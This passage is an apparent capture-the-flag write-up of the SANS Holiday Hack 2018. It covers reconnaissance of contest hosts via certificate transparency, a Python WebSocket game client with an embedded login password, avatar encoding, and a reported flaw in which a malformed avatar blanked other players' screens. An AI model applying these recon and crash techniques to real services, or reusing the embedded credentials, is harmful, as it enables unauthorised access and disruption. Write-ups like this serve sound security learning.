<td class="org-left">Google</td>
<td class="org-left">n/a</td>
<td class="org-left">Unknown</td>
</tr>

<tr>
<td class="org-left">erohetfanu.com</td>
<td class="org-left">Unknown: Something hidden?</td>
<td class="org-left">October 16th, 2018</td>
<td class="org-left">GoDaddy.com</td>
<td class="org-left">domaincontrol.com</td>
<td class="org-left">Google</td>
<td class="org-left">104.196.126.19</td>
<td class="org-left">Google Cloud</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-org2e40f41" class="outline-3">
<h3 id="org2e40f41">Certificate Transparency Logs</h3>
<div class="outline-text-3" id="text-org2e40f41">
<p>
After determining the domains for this year's Holiday Hack, we'd like
to figure out what systems there are in those domains. A good way of
doing this is via Certificate Transparency logs &#x2013; public logs which
serve as an audit mechanism for SSL certificates which are issued, in
order to detect mistaken or malicious certificates.
</p>

<p>
There are several free services which allow you to query these logs. I like using VirusTotal.com:
</p>


<div class="figure">
<p><img src="./imgs/certificates_kringlecastle.png" alt="certificates_kringlecastle.png" width="500px" />
</p>
<p><span class="figure-number">Figure 2: </span>Certificates for kringlecastle.com</p>
</div>


<div class="figure">
<p><img src="./imgs/certificates_kringlecon.png" alt="certificates_kringlecon.png" width="500px" />
</p>
<p><span class="figure-number">Figure 3: </span>Certificates for kringlecon.com</p>
</div>
</div>
</div>
<div id="outline-container-org13b860c" class="outline-3">
<h3 id="org13b860c">Monitoring</h3>
<div class="outline-text-3" id="text-org13b860c">
<p>
Since we found several hosts that use SSL certificates, it's a pretty
safe bet that they'll be web servers. We can set up monitoring to poll
some of these systems, so that we'll know as soon as the contest goes
live.
</p>


<div class="figure">
<p><img src="./imgs/monitor.png" alt="monitor.png" width="700px" />
</p>
<p><span class="figure-number">Figure 4: </span>Let the games begin&#x2026;</p>
</div>
</div>
</div>
<div id="outline-container-orge3f4965" class="outline-3">
<h3 id="orge3f4965">Summary</h3>
<div class="outline-text-3" id="text-orge3f4965">
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">IP Address</th>
<th scope="col" class="org-left">Hostname</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">35.185.2.206</td>
<td class="org-left">scanomatic.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">&#xa0;</td>
<td class="org-left">hohohodaddy.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">35.185.76.157</td>
<td class="org-left">docker2018-qa.kringlecon.com</td>
</tr>

<tr>
<td class="org-right">35.185.89.85</td>
<td class="org-left">git.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">35.185.103.210</td>
<td class="org-left">pianolockn.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">35.185.104.53</td>
<td class="org-left">docker.kringlecon.com</td>
</tr>

<tr>
<td class="org-right">35.190.187.47</td>
<td class="org-left">packalyzer.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">35.196.29.176</td>
<td class="org-left">doorpasscode.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">&#xa0;</td>
<td class="org-left">cfp.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">&#xa0;</td>
<td class="org-left">pianolock.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">35.196.162.157</td>
<td class="org-left">narrative.kringlecon.com</td>
</tr>

<tr>
<td class="org-right">35.229.118.54</td>
<td class="org-left">careers.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">35.237.171.66</td>
<td class="org-left">vents.kringlecastle.com</td>
</tr>

<tr>
<td class="org-right">35.243.215.176</td>
<td class="org-left">status.kringlecon.com</td>
</tr>

<tr>
<td class="org-right">104.196.14.143</td>
<td class="org-left">www.kringlecon.com</td>
</tr>

<tr>
<td class="org-right">&#xa0;</td>
<td class="org-left">kringlecon.com</td>
</tr>

<tr>
<td class="org-right">&#xa0;</td>
<td class="org-left">api.kringlecon.com</td>
</tr>

<tr>
<td class="org-right">&#xa0;</td>
<td class="org-left">rsvp.kringlecon.com</td>
</tr>

<tr>
<td class="org-right">104.196.66.61</td>
<td class="org-left">snortsensor1.kringlecastle.com</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div id="outline-container-orged0f5ec" class="outline-2">
<h2 id="linecon"><a id="orged0f5ec"></a>LineCon</h2>
<div class="outline-text-2" id="text-linecon">
<div id="text-table-of-contents">
<ul>
<li><a href="#org37bffb9">Goal</a></li>
<li><a href="#orgfe41fb4">Finding a hidden path</a></li>
<li><a href="#org4200f7c">Client-side tricks to make secrets stand out</a></li>
<li><a href="#org45078e7">Game Internals: WebSocket Messages</a></li>
<li><a href="#org2a2fb76">Game Internals: Avatar DNA</a></li>
<li><a href="#orgf8d2422">First Finding: Avatar vulnerability</a></li>
<li><a href="#org6a96770">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-org37bffb9" class="outline-3">
<h3 id="org37bffb9">Goal</h3>
<div class="outline-text-3" id="text-org37bffb9">
<div class="note">
<p>
Register for the conference, and look for any secrets
</p>

</div>
</div>
</div>
<div id="outline-container-orgfe41fb4" class="outline-3">
<h3 id="orgfe41fb4">Finding a hidden path</h3>
<div class="outline-text-3" id="text-orgfe41fb4">
<p>
While zooming out the browser window, something appeared off to the right:
</p>


<div class="figure">
<p><img src="./imgs/linecon_snow_path.png" alt="linecon_snow_path.png" />
</p>
<p><span class="figure-number">Figure 5: </span>A secret snow path</p>
</div>

<p>
Upon visiting the secret path, we could see a castle in the distance.
</p>


<div class="figure">
<p><img src="./imgs/linecon_kringlecastle.png" alt="linecon_kringlecastle.png" />
</p>
<p><span class="figure-number">Figure 6: </span>Kringle Castle?</p>
</div>
</div>
</div>
<div id="outline-container-org4200f7c" class="outline-3">
<h3 id="org4200f7c">Client-side tricks to make secrets stand out</h3>
<div class="outline-text-3" id="text-org4200f7c">
<p>
To make it easier to see hidden paths, we can use this JavaScript
snippet in our browser's Javascript console. To access the console, visit
<code>Tools</code> &rarr; <code>Web Developer</code> &rarr; <code>Web Console</code> in Firefox, and <code>View</code>
&rarr; <code>Developer</code> &rarr; <code>JavaScript Console</code> in Chrome.
</p>

<div class="org-src-container">
<pre class="src src-java"><span style="color: #228b22;">var</span> <span style="color: #a0522d;">i</span>; 
<span style="color: #228b22;">var</span> <span style="color: #a0522d;">lava</span> = document.getElementsByClassName(<span style="color: #ff0000; font-weight: bold;">'</span>lava<span style="color: #ff0000; font-weight: bold;">'</span>);
<span style="color: #a020f0;">for</span> ( i = 0; i &lt; lava.<span style="color: #228b22;">length</span>; i++ )
    { 
    lava[i].style.background = <span style="color: #8b2252;">"pink"</span>;
    };
</pre>
</div>

<p>
The game uses a special HTML class called "lava" for any element
which is "walkable." Our snippet finds all elements which have that
class, and then sets their background color to pink.
</p>


<div class="figure">
<p><img src="./imgs/linecon_console.png" alt="linecon_console.png" />
</p>
<p><span class="figure-number">Figure 7: </span>Making everything pink in the Console</p>
</div>


<div class="figure">
<p><img src="./imgs/linecon_pink_paths.png" alt="linecon_pink_paths.png" width="500px" />
</p>
<p><span class="figure-number">Figure 8: </span>Pink paths!</p>
</div>
</div>
</div>
<div id="outline-container-org45078e7" class="outline-3">
<h3 id="org45078e7">Game Internals: WebSocket Messages</h3>
<div class="outline-text-3" id="text-org45078e7">
<p>
Using the same Developer Tools, we can start reverse engineering
how the game works. As we'll discover, the game relies on WebSocket
messages. Firefox currently lacks the ability to view these
messages, so it's recommended to use Chrome for this portion.
</p>

<p>
This time, we'll use the <code>Network</code> tab in the Developer
Tools. Network traffic from your browser will be listed here. If
this tab wasn't open when the traffic was initiated, nothing will
show up, so it's best to have this tab open and then refresh the
page, to ensure we see everything. Once we login go the game, we
can filter on WebSocket connections by clicking on the <code>WS</code> filter,
and then view the <code>Frames</code> tab to see the individual messages:
</p>


<div class="figure">
<p><img src="./imgs/linecon_ws.png" alt="linecon_ws.png" />
</p>
<p><span class="figure-number">Figure 9: </span>WebSocket messages</p>
</div>

<p>
Messages in green are messages that we sent to the server, and the
other messages are the replies. By interacting with the game and
observing which messages are sent/received, we can slowly learn how
to interact with the game without a browser.
</p>

<p>
Using the new-found knowledge about WebSocket messages, we can create a simple client for the game:
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python3</span>

<span style="color: #a020f0;">import</span> asyncio
<span style="color: #a020f0;">import</span> simplejson <span style="color: #a020f0;">as</span> json
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> websockets

<span style="color: #a020f0;">async def</span> <span style="color: #0000ff;">hello</span>():
    <span style="color: #a020f0;">async with</span> websockets.connect(<span style="color: #8b2252;">'wss://api.kringlecon.com/ws'</span>) <span style="color: #a020f0;">as</span> websocket:

        <span style="color: #b22222;"># </span><span style="color: #b22222;">The initial connect message</span>
        <span style="color: #a020f0;">await</span> websocket.send(<span style="color: #8b2252;">'{"type":"WS_CONNECTED","session":null,"protocol":"43ae08fd-9cf2-4f54-a6a6-8454aef59581"}'</span>)

        <span style="color: #b22222;"># </span><span style="color: #b22222;">Wait for OHHIMARK</span>
        <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
            <span style="color: #a0522d;">response</span> = json.loads(<span style="color: #a020f0;">await</span> websocket.recv())
            <span style="color: #a020f0;">if</span> response[<span style="color: #8b2252;">'type'</span>] == <span style="color: #8b2252;">'WS_OHHIMARK'</span>:
                <span style="color: #a020f0;">break</span>

        <span style="color: #b22222;"># </span><span style="color: #b22222;">Send the login info</span>
        <span style="color: #a020f0;">await</span> websocket.send(<span style="color: #8b2252;">'{"type":"WS_LOGIN","usernameOrEmail":"VG","password":"3j6QMM3grTYYp7jWkie&amp;f"}'</span>)

        <span style="color: #b22222;"># </span><span style="color: #b22222;">Print out everything we get back</span>
        <span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
            <span style="color: #a0522d;">response</span> = json.loads(<span style="color: #a020f0;">await</span> websocket.recv())
            <span style="color: #a020f0;">print</span>(response)

asyncio.get_event_loop().run_until_complete(hello())
</pre>
</div>
</div>
</div>
<div id="outline-container-org2a2fb76" class="outline-3">
<h3 id="org2a2fb76">Game Internals: Avatar DNA</h3>
<div class="outline-text-3" id="text-org2a2fb76">
<p>
As we explored LineCon, one feature that drew our attention was
that the appearance of each avatar was encoded as DNA. Using the
standard DNA sequence letters (A, T, C, G), pairs of letters would
encode the numbers 0-3: <code>E = {AT: "0", TA: "1", GC: "2", CG:
   "3"}</code>. A neat detail is the fact that these pairs match DNA
nucleic-acid pairs (i.e. in the double-helix, A is complementary to
T, and C with G).
</p>

<p>
The avatar is encoded as a 120 character sequence, such as
<code>ATATATTAATATATATATATATTAATATATATCGTAGCCGATATATATATATTATAATATATATATATTAGCATATATTAATATATATATATGCATATATATATATATTAGCATATATCG</code>. Once
we convert the pairs back to numbers, we get a 60 digit sequence:
<code>000100000001000031230000001100000012000100000020000000120003</code>.
</p>

<p>
Inspecting the Javascript code, we can see how this sequence gets translated back to an avatar:
</p>

<div class="org-src-container">
<pre class="src src-javascript">C = [
   { name: <span style="color: #8b2252;">"size"</span>,       size: 4 }, 
   { name: <span style="color: #8b2252;">"legs"</span>,       size: 8 }, 
   { name: <span style="color: #8b2252;">"hue"</span>,        size: 8 }, 
   { name: <span style="color: #8b2252;">"torso"</span>,      size: 8 }, 
   { name: <span style="color: #8b2252;">"head"</span>,       size: 8 }, 
   { name: <span style="color: #8b2252;">"saturation"</span>, size: 4 }, 
   { name: <span style="color: #8b2252;">"mouth"</span>,      size: 8 },
   { name: <span style="color: #8b2252;">"eyes"</span>,       size: 8 }, 
   { name: <span style="color: #8b2252;">"brightness"</span>, size: 4 }];
</pre>
</div>

<p>
Returning to our example, we can convert the sequence to these
fields. A quick way to convert the numerical sequences is using
Python's <code>int</code> function with a base of 4: <code>int("0001", 4)</code>.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-right" />

<col  class="org-right" />

<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">Offset</th>
<th scope="col" class="org-right">Size</th>
<th scope="col" class="org-right">Sequence</th>
<th scope="col" class="org-left">Name</th>
<th scope="col" class="org-right">Value</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">0</td>
<td class="org-right">4</td>
<td class="org-right">0001</td>
<td class="org-left">size</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-right">8</td>
<td class="org-right">00000001</td>
<td class="org-left">legs</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-right">12</td>
<td class="org-right">8</td>
<td class="org-right">00003123</td>
<td class="org-left">hue</td>
<td class="org-right">219</td>
</tr>

<tr>
<td class="org-right">20</td>
<td class="org-right">8</td>
<td class="org-right">00000011</td>
<td class="org-left">torso</td>
<td class="org-right">5</td>
</tr>

<tr>
<td class="org-right">28</td>
<td class="org-right">8</td>
<td class="org-right">00000012</td>
<td class="org-left">head</td>
<td class="org-right">6</td>
</tr>

<tr>
<td class="org-right">36</td>
<td class="org-right">4</td>
<td class="org-right">0001</td>
<td class="org-left">saturation</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-right">40</td>
<td class="org-right">8</td>
<td class="org-right">00000020</td>
<td class="org-left">mouth</td>
<td class="org-right">8</td>
</tr>

<tr>
<td class="org-right">48</td>
<td class="org-right">8</td>
<td class="org-right">00000012</td>
<td class="org-left">eyes</td>
<td class="org-right">6</td>
</tr>

<tr>
<td class="org-right">56</td>
<td class="org-right">4</td>
<td class="org-right">0003</td>
<td class="org-left">brightness</td>
<td class="org-right">3</td>
</tr>
</tbody>
</table>

<p>
We can verify our decoding by searching for the names of the color
schemes in the Javascript. In the example sequence above, the
avatar selection modal used "Flimsy Cappuccino," which we can find
defined as: <code>{ name: "Flimsy Cappuccino", hue: 219, saturation: 1, brightness: 3 }</code>. An exact match!
</p>

<p>
Another cool mini-feature is that if you open up the <code>Console</code> tab
of your Developer Tools, you can see representations of the DNA
sequence:
</p>


<div class="figure">
<p><img src="./imgs/linecon_dna_sequence.png" alt="linecon_dna_sequence.png" width="500px" />
</p>
<p><span class="figure-number">Figure 10: </span>DNA Sequences in the Console tab</p>
</div>

<p>
The color scheme is: <code>{ A: "yellow", T: "green", C: "teal", G:
   "red" }</code>. So, in the example above, the top line starts <code>AAAT</code>, and
the bottom line is the complementary sequence <code>TTTA</code>.
</p>
</div>
</div>

<div id="outline-container-orgf8d2422" class="outline-3">
<h3 id="orgf8d2422">First Finding: Avatar vulnerability</h3>
<div class="outline-text-3" id="text-orgf8d2422">
<p>
In the <code>Network</code> tab of the Developer Tools, we can see other
resources that are being loaded by the game. One of these is an
image, called <code>egg.png</code>:
</p>


<div class="figure">
<p><img src="./imgs/egg.png" alt="egg.png" />
</p>
<p><span class="figure-number">Figure 11: </span>egg.png</p>
</div>

<p>
It seems like the game uses this when it can't load an image:
</p>

<div class="org-src-container">
<pre class="src src-javascript">render() {
   <span style="color: #a020f0;">const</span> {dna: <span style="color: #a0522d;">e</span>, version: <span style="color: #a0522d;">t</span>} = <span style="color: #008b8b;">this</span>.props;
   <span style="color: #a020f0;">if</span> (au.a.validateSequence(e))
      <span style="color: #a020f0;">return</span> du.a.createElement(<span style="color: #8b2252;">"div"</span>, { className: <span style="color: #8b2252;">"a-wild-missingno-appears"</span> }, 
                                  du.a.createElement(<span style="color: #8b2252;">"img"</span>, { src: <span style="color: #8b2252;">"images/egg.png"</span>, alt: <span style="color: #8b2252;">":)"</span> }));
</pre>
</div>

<p>
While investigating this mysterious image, it was discovered that
we could use our WebSocket client to set an invalid avatar for
ourselves.
</p>

<p>
Doing this caused an exception which would render our game completely black and inoperable.
</p>

<p>
Worse yet, our avatar was being loaded by other players in the game, and it would cause <b>their</b> screens to go black as well.
</p>

<p>
We quickly set our avatar back to its original state, and reported this issue to the SANS Counter Hack team. They quickly issued a fix for it.
</p>
</div>
</div>
<div id="outline-container-org6a96770" class="outline-3">
<h3 id="org6a96770">Summary</h3>
<div class="outline-text-3" id="text-org6a96770">
<p>
LineCon was a great preview! We prepped some in-browser tricks for
making paths or other interesting elements stand out. We wrote a
simple Python script which allowed us to interact directly with the
game. And we discovered and reported our first vulnerability.
</p>
</div>
</div>
</div>
<div id="outline-container-org1f7b77b" class="outline-2">
<h2 id="kringlecon"><a id="org1f7b77b"></a>KringleCon</h2>
<div class="outline-text-2" id="text-kringlecon">
</div>
<div id="outline-container-orgf7285b5" class="outline-3">
<h3 id="orgf7285b5">Map</h3>
<div class="outline-text-3" id="text-orgf7285b5">
<p>
First, we walk around, familiarizing ourselves with the surroundings:
</p>


<div class="figure">
<p><img src="./imgs/map.png" alt="map.png" />
</p>
</div>
</div>
</div>

<div id="outline-container-orga0e56ae" class="outline-3">
<h3 id="orga0e56ae">Story</h3>
<div class="outline-text-3" id="text-orga0e56ae">
<blockquote>
<p>
As you walk through the gates, a familiar red-suited holiday figure
warmly welcomes all of his special visitors to KringleCon.
</p>
</blockquote>

<p>
Your narrative begins when you stop to chat with Santa and he shares
the preceding.
</p>

<p>
Continuing into the castle, you begin to poke around. Once you
complete the door passcode challenge and receive the
<code>doorpasscode_completed</code> token, you start to notice some suspicious
behavior:
</p>

<blockquote>
<p>
Suddenly, all elves in the castle start looking very
nervous. You can overhear some of them talking with worry in their
voices. The toy soldiers, who were always gruff, now seem especially
determined as they lock all the exterior entrances to the building
and barricade all the doors. No one can get out! And the toy
soldiers' grunts take on an increasingly sinister tone.
</p>
</blockquote>

<p>
You carry on and help out by finding some secrets in a git
repository. This unlocks the <code>datarepohack_completed</code> token. While
receiving that, you begin to see something disturbing, the toy
soldiers act even more aggressively.
</p>

<blockquote>
<p>
They are searching for something &#x2013; something very special inside of
Santa’s castle &#x2013; and they will stop at NOTHING until they find it.
</p>
</blockquote>

<p>
Hans seems to be directing their activities. What could they be
after? In the main lobby on the bottom floor of Santa's castle,
Hans calls everyone around to deliver a speech.  Make sure you visit
Hans to hear his speech." What could he have to say?
</p>

<blockquote>
<p>
Ladies and Gentlemen…
</p>

<p>
Due to the North Pole’s legacy of providing coal as presents around the globe &#x2026;
</p>

<p>
&#x2026; they are about to be taught a lesson in the real use of POWER.
</p>

<p>
You will be witnesses.
</p>

<p>
Now, Santa… that’s a nice suit… John Philips, North Pole. I have two myself. Rumor has it Alabaster buys his there.
</p>

<p>
I have comrades in arms around the world who are languishing in prison.
</p>

<p>
The Elvin State Department enjoys rattling its saber for its own ends. Now it can rattle it for ME.
</p>

<p>
The following people are to be released from their captors.
</p>

<p>
In the Dungeon for Errant Reindeer, the seven members of the New Arietes Front.
</p>

<p>
In Whoville Prison, the imprisoned leader of ATNAS Corporation, Miss Cindy Lou Who.
</p>

<p>
In the Land of Oz, Glinda the Good Witch.
</p>
</blockquote>

<p>
All of a sudden, all of the toy soldiers are similarly taken by Die Hard references:
</p>

<blockquote>
<p>
Grunt!
</p>

<p>
Links.
</p>

<p>
Nein! Nein! Nein!
</p>

<p>
No one is coming to help you.
</p>

<p>
Get the over here!
</p>

<p>
Schnell!
</p>
</blockquote>

<p>
As you keep digging for secrets trying to figure out just what’s
going on here, you break into the domain and get the
<code>domainhack_completed</code> token. This reveals another, even more sinister
sight: 
</p>

<blockquote>
<p>
The toy soldiers continue behaving very rudely, grunting
orders to the guests and to each other in vaguely Germanic phrases.
Suddenly, one of the toy soldiers appears wearing a grey sweatshirt
that has written on it in red pen, "NOW I HAVE A ZERO-DAY.
HO-HO-HO."
</p>
</blockquote>

<p>
The elves are panicking:
</p>

<blockquote>
<p>
Oh my! Santa’s castle… it’s under siege!
</p>

<p>
We’re trapped inside and can’t leave.
</p>

<p>
The toy soldiers are blocking all of the exits!
</p>

<p>
We are all prisoners!
</p>
</blockquote>

<p>
That is worrisome, but even more so when you start to hear, "A rumor
spreads among the elves that Alabaster has lost his badge.  Several
elves say, 'What do you think someone could do with that?'"
</p>

<p>
Quickly trying to help out and save the castle from attack, you find
an example badge used to beat the qrcode Scan-O-Matic
objective. Finding a way to trick your way through this badge reader
to earn your <code>qrcode_completed</code> token, you hear, "Congratulations! You
have gained access to Santa's secret room." This is great, but then
you quickly learn that, "Hans has started monologuing again. Please
visit him in Santa's lobby for a status update."
</p>

<p>
Our captor tells us:
</p>

<blockquote>
<p>
So, you’ve figured out my plan – it’s not about freeing those prisoners.
</p>

<p>
The toy soldiers and I are here to steal the contents of Santa’s vault!
</p>

<p>
You think that after all my posturing, all my little speeches, that I’m nothing but a common thief.
</p>

<p>
But, I tell you &#x2013; I am an exceptional thief.
</p>

<p>
And since I've moved up to kidnapping all of you, you should be more polite!
</p>
</blockquote>

<p>
As you go listen to Hans, you notice a vent cover that seems&#x2026; not
quite right. As you wonder where this maze of a vent system could
take you, you eventually find your way out. This unlocks the
<code>ventmaze_completed</code> token and you find yourself in a new room. "Great
work!  You have blocked access to Santa's treasure&#x2026; for now.
Please visit Hans in Santa's Secret Room for an update." As you
approach Hans, "&#x2026;suddenly, Hans slips and falls into a snowbank
[editor’s note: that is strangely located inside this secret, third
story room hidden in a castle]. His nefarious plan thwarted, he's
now just cold and wet." Things are starting to look up, "But Santa
still has more questions for you to solve!"
</p>

<p>
You need to find Santa to see if you can answer his questions. Your
eye lands on a door you couldn’t have seen before. It won’t open and
has some strange musical lock on it. After struggling with it, you
finally defeat the lock and collect the <code>pianolock_completed</code>
token. With this, you are able to enter this final hidden room and
talk to Santa. 
</p>

<blockquote>
<p>
Congrats!  You have solved the hardest challenge!  Please visit
Santa and Hans inside Santa's Secret Room for an update on your
amazing accomplishment!
</p>
</blockquote>

<p>
The elves say "YAY! You won!", and Hans and the now hat-less toy soldiers join in on congratulating us. Santa explains:
</p>

<blockquote>
<p>
You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test!
</p>

<p>
You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot!
</p>

<p>
You see, I finally found you!
</p>

<p>
I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.
</p>

<p>
That’s why we had so many different challenges this year.
</p>

<p>
We needed to find someone with skills all across the spectrum.
</p>

<p>
I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised.
</p>

<p>
And you did!
</p>

<p>
Oh, and those brutish toy soldiers? They are really just some of my elves in disguise.
</p>

<p>
See what happens when they take off those hats?
</p>

<p>
Based on your victory&#x2026; next year, I’m going to ask for your help in defending my whole operation from evil bad guys.
</p>

<p>
And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will.
</p>

<p>
You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?
</p>

<p>
They lived happily ever after.
</p>
</blockquote>

<p>
Walking back out of these once secret rooms, as you leave the castle
and hear Jason the plant's lament of psmitty, you realize that
instead of snaking through the arduous, confusing maze of vents, you
could have won the <code>elfhrhack_completed</code> token and gotten the same
access, and heard the same information. Oh well, you saved the day,
and what action hero are you really if you don’t come out looking
bloodied and dirtied like this at the end?
</p>



<div class="figure">
<p><img src="./imgs/vents_diehard.jpg" alt="vents_diehard.jpg" />
</p>
</div>
</div>
</div>
<div id="outline-container-org96fc903" class="outline-3">
<h3 id="org96fc903">Bonus: Crawling through the Vents</h3>
<div class="outline-text-3" id="text-org96fc903">
<blockquote>
<p>
Now I know what a TV dinner feels like.  &#x2014;John McClane
</p>
</blockquote>
</div>
<div id="outline-container-org2dd7c16" class="outline-4">
<h4 id="org2dd7c16">Solution 1: Manually Crafted Vent Maze</h4>
<div class="outline-text-4" id="text-org2dd7c16">
<p>
On the left side of the lobby in Santa's Castle is a large air
vent that's large enough to crawl through, upon entering it's soon
clear that this is a maze.  This can be solved manually by
carefully crafting a map during an hour long meeting (not that
anyone would do that).
</p>


<div class="figure">
<p><img src="./imgs/vents_solution1.png" alt="vents_solution1.png" />
</p>
</div>
</div>
</div>
<div id="outline-container-org01b296a" class="outline-4">
<h4 id="org01b296a">Solution 2: Recover Map from Git Repository</h4>
<div class="outline-text-4" id="text-org01b296a">
<p>
In <a href="#obj4">Objective 4</a>, we manage to recover a map from the GitLab server.
</p>
</div>
</div>
<div id="outline-container-org62c72c2" class="outline-4">
<h4 id="maze_solver"><a id="org62c72c2"></a>Solution 3: Automated Maze Solver</h4>
<div class="outline-text-4" id="text-maze_solver">
<p>
Perhaps the most fun way to solve the maze is programmatically. To move, your browser sends a request like:
</p>

<p>
<a href="https://vents.kringlecastle.com/move?heading=w&amp;mazex=23&amp;mazey=19&amp;mazef=1&amp;playeraction=forward&amp;locationkey=ba49a09644aa8fa7fb0082e935f46521&amp;resourceid=inigomontoya">https://vents.kringlecastle.com/move?heading=w&amp;mazex=23&amp;mazey=19&amp;mazef=1&amp;playeraction=forward&amp;locationkey=ba49a09644aa8fa7fb0082e935f46521&amp;resourceid=inigomontoya</a>
</p>

<p>
Breaking that out to be more clear:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Field</th>
<th scope="col" class="org-left">Value</th>
<th scope="col" class="org-left">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left"><code>heading</code></td>
<td class="org-left"><code>w</code></td>
<td class="org-left">Current heading: n=north, w=west, s=south, e=east</td>
</tr>

<tr>
<td class="org-left"><code>mazex</code></td>
<td class="org-left"><code>23</code></td>
<td class="org-left">Current X coordinate</td>
</tr>

<tr>
<td class="org-left"><code>mazey</code></td>
<td class="org-left"><code>19</code></td>
<td class="org-left">Current Y coordinate</td>
</tr>

<tr>
<td class="org-left"><code>mazef</code></td>
<td class="org-left"><code>1</code></td>
<td class="org-left">Current maze floor</td>
</tr>

<tr>
<td class="org-left"><code>playeraction</code></td>
<td class="org-left"><code>forward</code></td>
<td class="org-left">Potentially valid options: forward, backward, up, down</td>
</tr>

<tr>
<td class="org-left"><code>locationkey</code></td>
<td class="org-left"><code>ba49a09644aa8fa7fb0082e935f46521</code></td>
<td class="org-left">The unique location id key for where you currently are</td>
</tr>

<tr>
<td class="org-left"><code>resourceid</code></td>
<td class="org-left"><code>inigomontoya</code></td>
<td class="org-left">Never changes, clearly a reference to The Princess Bride</td>
</tr>
</tbody>
</table>

<p>
It's important to note that every location on the vent map has a
unique locationkey.  So we can't just sent a request for every
possible x,y,f position without traversing the maze and learning
the location keys.  Assuming you send an action that moves you to
a valid location, the server response will include a number of
variables outlining your current state:
</p>

<div class="org-src-container">
<pre class="src src-javascript">window.onload = <span style="color: #a020f0;">function</span>() {

  document.getElementById(<span style="color: #8b2252;">"top"</span>).style.visibility=<span style="color: #8b2252;">"hidden"</span>;
  document.getElementById(<span style="color: #8b2252;">"bottom"</span>).style.visibility=<span style="color: #8b2252;">"hidden"</span>;
  document.getElementById(<span style="color: #8b2252;">"arrow-up"</span>).style.visibility=<span style="color: #8b2252;">"hidden"</span>;
  document.getElementById(<span style="color: #8b2252;">"arrow-down"</span>).style.visibility=<span style="color: #8b2252;">"hidden"</span>;

  <span style="color: #b22222;">//</span><span style="color: #b22222;">next section depends on player state</span>
  document.getElementById(<span style="color: #8b2252;">"mazeform"</span>).elements.namedItem(<span style="color: #8b2252;">"heading"</span>).value = <span style="color: #8b2252;">"w"</span>;
  document.getElementById(<span style="color: #8b2252;">"mazeform"</span>).elements.namedItem(<span style="color: #8b2252;">"mazex"</span>).value = <span style="color: #8b2252;">"22"</span>;
  document.getElementById(<span style="color: #8b2252;">"mazeform"</span>).elements.namedItem(<span style="color: #8b2252;">"mazey"</span>).value = <span style="color: #8b2252;">"19"</span>;
  document.getElementById(<span style="color: #8b2252;">"mazeform"</span>).elements.namedItem(<span style="color: #8b2252;">"mazef"</span>).value = <span style="color: #8b2252;">"1"</span>;
  document.getElementById(<span style="color: #8b2252;">"mazeform"</span>).elements.namedItem(<span style="color: #8b2252;">"locationkey"</span>).value = <span style="color: #8b2252;">"07edf09b26a307b9fe4f40bedffe76ed"</span>;
  document.getElementById(<span style="color: #8b2252;">"mazeform"</span>).elements.namedItem(<span style="color: #8b2252;">"resourceid"</span>).value = <span style="color: #8b2252;">"inigomontoya"</span>;
  document.getElementById(<span style="color: #8b2252;">"wallform"</span>).elements.namedItem(<span style="color: #8b2252;">"northwall"</span>).value = <span style="color: #8b2252;">"True"</span>;
  document.getElementById(<span style="color: #8b2252;">"wallform"</span>).elements.namedItem(<span style="color: #8b2252;">"southwall"</span>).value = <span style="color: #8b2252;">"True"</span>;
  document.getElementById(<span style="color: #8b2252;">"wallform"</span>).elements.namedItem(<span style="color: #8b2252;">"eastwall"</span>).value = <span style="color: #8b2252;">"False"</span>;
  document.getElementById(<span style="color: #8b2252;">"wallform"</span>).elements.namedItem(<span style="color: #8b2252;">"westwall"</span>).value = <span style="color: #8b2252;">"False"</span>;

  wallcheck();  <span style="color: #b22222;">//</span><span style="color: #b22222;">render correct walls once state is known</span>
};
</pre>
</div>

<p>
The important parts here are the True/False value of the four
walls, which gives us valid headings, and the locationkey for our
new coordinates.  The size of the response is generally within a
few bytes (3509-3514) which can be used to help find locations
that aren't like the others, like the shaft to the second floor
and the exit.  In these cases the response size changes as well as
the arrow-up/arrow-down elements may be visible instead of hidden.
</p>

<p>
A Python script was written to automatically
solve the maze by always going right.  It generates a map with the
following final output.  'S' is the starting location, 'U' and 'D'
represent up and down possibilities, and 'X' marks the current
location: the exit.
</p>

<pre class="example">
U.███████.█████.█.█.███    D████████..............
